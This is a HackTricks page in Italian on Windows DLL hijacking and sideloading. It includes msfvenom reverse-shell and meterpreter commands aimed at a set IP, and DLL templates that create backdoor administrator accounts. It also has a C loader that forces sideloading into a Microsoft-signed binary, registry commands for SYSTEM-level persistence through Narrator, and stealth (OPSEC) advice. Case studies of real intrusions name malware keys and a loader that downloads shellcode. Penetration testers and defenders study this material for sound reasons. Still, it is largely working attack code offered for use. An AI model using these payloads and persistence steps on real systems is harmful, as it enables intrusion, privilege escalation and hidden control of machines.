# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

DLL Hijacking consiste nel manipolare un'applicazione affidabile affinché carichi una DLL dannosa. Questo termine include diverse tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene utilizzato principalmente per code execution, achieving persistence e, meno comunemente, privilege escalation. Nonostante qui l'attenzione sia sull'escalation, il metodo di hijacking rimane lo stesso indipendentemente dall'obiettivo.

### Tecniche comuni

Vengono impiegati diversi metodi per il DLL hijacking, ognuno con la propria efficacia a seconda della strategia di caricamento delle DLL dell'applicazione:

1. **DLL Replacement**: Sostituire una DLL genuina con una maligna, eventualmente usando DLL Proxying per preservare la funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: Posizionare la DLL malevola in un percorso di ricerca che precede quello legittimo, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creare una DLL malevola che l'applicazione caricherà pensando sia una DLL richiesta inesistente.
4. **DLL Redirection**: Modificare i parametri di ricerca come %PATH% o i file .exe.manifest / .exe.local per indirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: Sostituire la DLL legittima con una controparte malevola nella directory WinSxS, un metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: Posizionare la DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, somigliante a tecniche di Binary Proxy Execution.

> [!TIP]
> Per una catena passo-passo che impila HTML staging, AES-CTR configs e .NET implants sopra DLL sideloading, rivedi il workflow qui sotto.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Trovare DLL mancanti

Il modo più comune per trovare DLL mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di sysinternals, **impostando** i **seguenti 2 filtri**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e mostrare solo l'**File System Activity**:

![](<../../../images/image (153).png>)

Se stai cercando **DLL mancanti in generale** lascia questo in esecuzione per alcuni **secondi**.\
Se stai cercando una **DLL mancante dentro uno specifico eseguibile** dovresti impostare **un altro filtro come "Process Name" "contains" `<exec name>`, eseguirlo e fermare la cattura degli eventi**.

## Sfruttare DLL mancanti

Per poter escalate privileges, la miglior opportunità che abbiamo è poter **scrivere una DLL che un processo privilegiato tenterà di caricare** in uno dei **luoghi dove verrà cercata**. Di conseguenza, potremo **scrivere** una DLL in una **cartella** dove la **DLL viene cercata prima** della cartella in cui si trova la **DLL originale** (caso raro), oppure potremo **scrivere in una cartella dove la DLL verrà cercata** e la DLL originale **non esiste** in nessuna cartella.

### Ordine di ricerca DLL

Nella [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puoi trovare come le DLL vengono caricate nello specifico.**

Le applicazioni Windows cercano le DLL seguendo una serie di **percorsi di ricerca predefiniti**, rispettando una sequenza particolare. Il problema del DLL hijacking si verifica quando una DLL dannosa è posizionata strategicamente in una di queste directory, assicurandosi di essere caricata prima della DLL autentica. Una soluzione per prevenirlo è garantire che l'applicazione utilizzi percorsi assoluti quando fa riferimento alle DLL di cui ha bisogno.

Puoi vedere di seguito l'**ordine di ricerca delle DLL su sistemi a 32-bit**:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Questo è l'ordine di ricerca **predefinito** con **SafeDllSearchMode** abilitato. Quando è disabilitato la directory corrente sale al secondo posto. Per disabilitare questa funzione, crea il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostalo a 0 (di default è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH** la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che **una DLL può essere caricata indicando il percorso assoluto invece che solo il nome**. In quel caso quella DLL verrà **ricercata solo in quel percorso** (se la DLL ha delle dipendenze, queste verranno cercate come se la DLL fosse stata appena caricata per nome).

Esistono altri modi per alterare l'ordine di ricerca ma non li spiegherò qui.

### Forzare il sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Un modo avanzato per influenzare in modo deterministico il DLL search path di un processo appena creato è impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS quando si crea il processo con le API native di ntdll. Fornendo qui una directory controllata dall'attaccante, un processo target che risolve una DLL importata per nome (nessun percorso assoluto e senza usare i flag di caricamento sicuro) può essere forzato a caricare una DLL malevola da quella directory.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Notes/limitations
- This affects the child process being created; it is different from SetDllDirectory, which affects the current process only.
- The target must import or LoadLibrary a DLL by name (no absolute path and not using LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs and hardcoded absolute paths cannot be hijacked. Forwarded exports and SxS may change precedence.

Esempio minimo in C (ntdll, wide strings, gestione semplificata degli errori):

<details>
<summary>Esempio C completo: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Esempio di utilizzo operativo
- Posiziona una xmllite.dll malevola (esportando le funzioni richieste o facendo da proxy a quella reale) nella tua directory DllPath.
- Avvia un signed binary noto per cercare xmllite.dll per nome usando la tecnica sopra. Il loader risolve l'import tramite la DllPath fornita e sideloads la tua DLL.

Questa tecnica è stata osservata in-the-wild per alimentare catene multi-stage di sideloading: un launcher iniziale deposita una helper DLL, che poi avvia un Microsoft-signed, hijackable binary con una DllPath personalizzata per forzare il caricamento della DLL dell’attaccante da una staging directory.


#### Eccezioni all'ordine di ricerca delle DLL dalla documentazione Windows

Alcune eccezioni all'ordine di ricerca standard delle DLL sono indicate nella documentazione di Windows:

- Quando viene incontrata una **DLL che condivide il nome con una già caricata in memoria**, il sistema ignora la ricerca usuale. Invece, esegue un controllo per la redirezione e per un manifest prima di usare la DLL già presente in memoria. **In questo scenario, il sistema non esegue la ricerca della DLL**.
- Nei casi in cui la DLL è riconosciuta come una **known DLL** per la versione corrente di Windows, il sistema utilizzerà la sua versione della known DLL, insieme a qualsiasi DLL dipendente, **saltando il processo di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene la lista di queste known DLLs.
- Se una **DLL ha dipendenze**, la ricerca per queste DLL dipendenti viene condotta come se fossero indicate solo dai loro **module names**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un percorso completo.

### Escalation dei privilegi

**Requisiti**:

- Identificare un processo che opera o opererà con **privilegi differenti** (movimento orizzontale o laterale), che **manca di una DLL**.
- Assicurarsi che sia disponibile **accesso in scrittura** per qualsiasi **directory** nella quale la **DLL** verrà **ricercata**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory all'interno del system path.

Sì, i requisiti sono complicati da trovare dato che **di default è piuttosto raro trovare un eseguibile privilegiato privo di una DLL** e risulta ancora **più strano avere permessi di scrittura su una cartella del system path** (di default non è possibile). Ma, in ambienti malconfigurati questo è possibile.\
Nel caso tu sia fortunato e soddisfi i requisiti, puoi dare un'occhiata al progetto [UACME](https://github.com/hfiref0x/UACME). Anche se **l'obiettivo principale del progetto è bypass UAC**, potresti trovare lì un **PoC** di un Dll hijaking per la versione di Windows che puoi usare (probabilmente cambiando solo il percorso della cartella in cui hai permessi di scrittura).

Nota che puoi **verificare i tuoi permessi in una cartella** eseguendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla i permessi di tutte le cartelle in PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare le importazioni di un eseguibile e le esportazioni di una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abusare Dll Hijacking per elevare i privilegi** avendo permessi di scrittura in una **System Path folder** controlla:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatizzati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificherà se hai permessi di scrittura su qualsiasi cartella all'interno del system PATH.\
Altri strumenti automatizzati interessanti per scoprire questa vulnerabilità sono le **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Nel caso tu trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo è **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. Comunque, nota che Dll Hijacking è utile per [escalare da Medium Integrity level a High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** in questo studio su dll hijacking focalizzato sull'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **template** o per creare una **dll con funzioni non richieste esportate**.

## **Creazione e compilazione Dlls**

### **Dll Proxifying**

Fondamentalmente una **Dll proxy** è una Dll in grado di **eseguire il tuo codice malevolo quando viene caricata** ma anche di **esporsi** e **funzionare** come previsto inoltrando tutte le chiamate alla libreria reale.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** che vuoi proxify e **generare una proxified dll** o **indicare la Dll** e **generare una proxified dll**.

### **Meterpreter**

**Ottieni rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86 non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il tuo

Nota che in diversi casi la Dll che compili deve **export several functions** che verranno caricate dal victim process; se queste funzioni non esistono la **binary won't be able to load** them e l'**exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio di C++ DLL con creazione utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa con entry del thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Caso di studio: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continua a cercare, all'avvio, una DLL di localizzazione prevedibile e specifica per lingua che può essere hijacked per arbitrary code execution e persistence.

Punti chiave
- Probe path (build correnti): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build precedenti): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se una DLL scrivibile controllata dall'attaccante esiste nel percorso OneCore, viene caricata e `DllMain(DLL_PROCESS_ATTACH)` viene eseguito. Non sono necessari exports.

Rilevamento con Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Avvia Narrator e osserva il tentativo di caricamento del percorso sopra.

DLL minima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Un hijack ingenuo farà parlare/evidenziare l'interfaccia utente. Per restare silenti, al momento dell'attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e `SuspendThread`arlo; continua nel tuo thread. Vedi il PoC per il codice completo.

Trigger and persistence via Accessibility configuration
- Contesto utente (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, avviare Narrator caricherà la DLL piantata. Sulla secure desktop (schermata di accesso), premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sulla secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Permetti il livello di sicurezza RDP classico: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Connettiti via RDP all'host; sulla schermata di accesso premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul secure desktop.
- L'esecuzione si interrompe quando la sessione RDP si chiude—inietta/migra tempestivamente.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce di registro di un Accessibility Tool (AT) integrato (es. CursorIndicator), modificarla per puntare a un binario/DLL arbitrario, importarla e poi impostare `configuration` su quel nome di AT. Questo funge da proxy per l'esecuzione arbitraria tramite il framework Accessibility.

Notes
- Scrivere in `%windir%\System32` e modificare valori in HKLM richiede privilegi di amministratore.
- Tutta la logica del payload può risiedere in `DLL_PROCESS_ATTACH`; non sono necessari export.

## Caso di studio: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Questo caso dimostra **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.

### Dettagli della vulnerabilità

- **Componente**: `TPQMAssistant.exe` situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` viene eseguito quotidianamente alle 9:30 sotto il contesto dell'utente loggato.
- **Directory Permissions**: Scrivibile da `CREATOR OWNER`, permettendo agli utenti locali di inserire file arbitrari.
- **DLL Search Behavior**: Tenta di caricare `hostfxr.dll` dalla sua directory di lavoro prima e registra "NAME NOT FOUND" se mancante, indicando la precedenza della ricerca nella directory locale.

### Implementazione dell'exploit

Un attaccante può posizionare uno stub malevolo `hostfxr.dll` nella stessa directory, sfruttando la mancanza della DLL per ottenere l'esecuzione di codice nel contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flusso di attacco

1. Come utente standard, posiziona `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendi che l'attività pianificata venga eseguita alle 9:30 nel contesto dell'utente corrente.
3. Se un amministratore è connesso al momento dell'esecuzione dell'attività, la DLL malevola viene eseguita nella sessione dell'amministratore con integrità media.
4. Collega tecniche standard di bypass UAC per elevare dall'integrità media ai privilegi SYSTEM.

## Caso di studio: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Gli attori di minaccia spesso abbinano droppers basati su MSI con DLL side-loading per eseguire payload sotto un processo affidabile e firmato.

Chain overview
- L'utente scarica un MSI. Una CustomAction viene eseguita in silenzio durante l'installazione GUI (es. LaunchApplication o un'azione VBScript), ricostruendo la fase successiva da risorse incorporate.
- Il dropper scrive un EXE legittimo e firmato e una DLL malevola nella stessa directory (esempio pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Quando l'EXE firmato viene avviato, l'ordine di ricerca DLL di Windows carica wsc.dll dalla directory di lavoro per prima, eseguendo codice dell'attaccante sotto un processo padre firmato (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Cerca voci che eseguono eseguibili o VBScript. Esempio di pattern sospetto: LaunchApplication che esegue un file incorporato in background.
- In Orca (Microsoft Orca.exe), ispeziona le tabelle CustomAction, InstallExecuteSequence e Binary.
- Embedded/split payloads in the MSI CAB:
- Estrazione amministrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oppure usa lessmsi: lessmsi x package.msi C:\out
- Cerca più piccoli frammenti che sono concatenati e decrittografati da una CustomAction VBScript. Flusso comune:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading pratico con wsc_proxy.exe
- Posiziona questi due file nella stessa cartella:
- wsc_proxy.exe: host firmato legittimo (Avast). Il processo tenta di caricare wsc.dll per nome dalla sua directory.
- wsc.dll: attacker DLL. Se non sono richieste exports specifiche, DllMain può essere sufficiente; altrimenti, crea una proxy DLL e inoltra le exports richieste alla libreria genuina mentre esegui il payload in DllMain.
- Crea un payload DLL minimale:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Per i requisiti di esportazione, usa un framework di proxying (es., DLLirant/Spartacus) per generare una DLL di forwarding che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione dei nomi DLL da parte del binario host. Se l'host usa percorsi assoluti o flag di caricamento sicuro (es., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), il hijack potrebbe fallire.
- KnownDLLs, SxS, and forwarded exports possono influenzare la precedenza e devono essere considerati nella scelta del binario host e dell'insieme di export.

## Triadi firmate + payload crittografati (Caso di studio: ShadowPad)

Check Point ha descritto come Ink Dragon distribuisce ShadowPad usando una **triade di tre file** per mimetizzarsi con software legittimo mantenendo il payload principale crittografato su disco:

1. **EXE host firmato** – vendor come AMD, Realtek o NVIDIA vengono abusati (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli attaccanti rinominano l'eseguibile per farlo assomigliare a un binario Windows (per esempio `conhost.exe`), ma la firma Authenticode rimane valida.
2. **DLL loader malevola** – posizionata accanto all'EXE con un nome atteso (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è di solito un binario MFC offuscato con il framework ScatterBrain; il suo unico compito è trovare il blob crittografato, decrittarlo e mappare ShadowPad in memoria in modo riflessivo.
3. **Blob di payload crittografato** – spesso memorizzato come `<name>.tmp` nella stessa directory. Dopo aver mappato in memoria il payload decrittato, il loader elimina il file TMP per distruggere le prove forensi.

Note di tradecraft:

* Rinominare l'EXE firmato (mantendendo comunque `OriginalFileName` nell'header PE) gli permette di mascherarsi come un binario Windows pur conservando la firma del vendor, quindi replica l'abitudine di Ink Dragon di lasciare binari dall'aspetto `conhost.exe` che in realtà sono utility AMD/NVIDIA.
* Poiché l'eseguibile resta considerato trusted, la maggior parte dei controlli di allowlisting richiede solo che la tua DLL malevola sia presente nella stessa cartella. Concentrati sul personalizzare la DLL loader; il binario firmato può tipicamente essere eseguito senza modifiche.
* Il decryptor di ShadowPad si aspetta che il blob TMP risieda accanto al loader e sia scrivibile così da poter azzerare il file dopo la mappatura. Mantieni la directory scrivibile finché il payload non è caricato; una volta in memoria il file TMP può essere eliminato in sicurezza per OPSEC.

## Caso di studio: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una recente intrusione Lotus Blossom ha abusato di una catena di aggiornamento trusted per consegnare un dropper impacchettato con NSIS che ha orchestrato un DLL sideload oltre a payload completamente in-memory.

Flusso operativo
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca **HIDDEN**, deposita un Bitdefender Submission Wizard rinominato `BluetoothService.exe`, una `log.dll` malevola e un blob crittografato `BluetoothService`, quindi avvia l'EXE.
- L'EXE host importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` mappa il blob in memoria (mmap); `LogWrite` lo decrittografa con uno stream custom basato su LCG (costanti **0x19660D** / **0x3C6EF35F**, materiale chiave derivato da un hash precedente), sovrascrive il buffer con shellcode in chiaro, libera le temporanee e salta su di esso.
- Per evitare un IAT, il loader risolve le API hashando i nomi degli export usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, poi applicando un'avalanche in stile Murmur (**0x85EBCA6B**) e confrontando con hash target salati.

Shellcode principale (Chrysalis)
- Decrittografa un modulo principale tipo PE ripetendo add/XOR/sub con chiave `gQ2JR&9;` per cinque passaggi, poi carica dinamicamente `Kernel32.dll` → `GetProcAddress` per completare la risoluzione delle importazioni.
- Ricostruisce le stringhe dei nomi DLL a runtime tramite trasformazioni per carattere di bit-rotate/XOR, poi carica `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un secondo resolver che itera la **PEB → InMemoryOrderModuleList**, analizza ogni export table in blocchi da 4 byte con mixing in stile Murmur e ricorre a `GetProcAddress` solo se l'hash non viene trovato.

Configurazione incorporata & C2
- La config risiede dentro il file `BluetoothService` droppato a **offset 0x30808** (size **0x980**) ed è decrittata con RC4 usando la chiave `qwhvb^435h&*7`, rivelando l'URL C2 e lo User-Agent.
- I beacon costruiscono un profilo host delimitato da punti, prefissano il tag `4Q`, poi lo cifrano con RC4 con chiave `vAuig34%^325hGV` prima di `HttpSendRequestA` su HTTPS. Le risposte sono decrittate in RC4 e gestite da uno switch sui tag (`4T` shell, `4V` esecuzione processo, `4W/4X` scrittura file, `4Y` lettura/exfil, `4\\` uninstall, `4` enumerazione drive/file + casi di trasferimento chunked).
- La modalità di esecuzione è determinata dagli argomenti CLI: nessun argomento = installa persistenza (service/Run key) puntando a `-i`; `-i` rilancia se stesso con `-k`; `-k` salta l'install e esegue il payload.

Loader alternativo osservato
- La stessa intrusione ha droppato Tiny C Compiler ed eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` accanto. Il sorgente C fornito dall'attaccante incorporava lo shellcode, veniva compilato ed eseguito in-memory senza toccare il disco con un PE. Replicare con:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Questa fase compile-and-run basata su TCC ha importato `Wininet.dll` a runtime e ha recuperato un second-stage shellcode da un hardcoded URL, fornendo un loader flessibile che si maschera come un compiler run.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
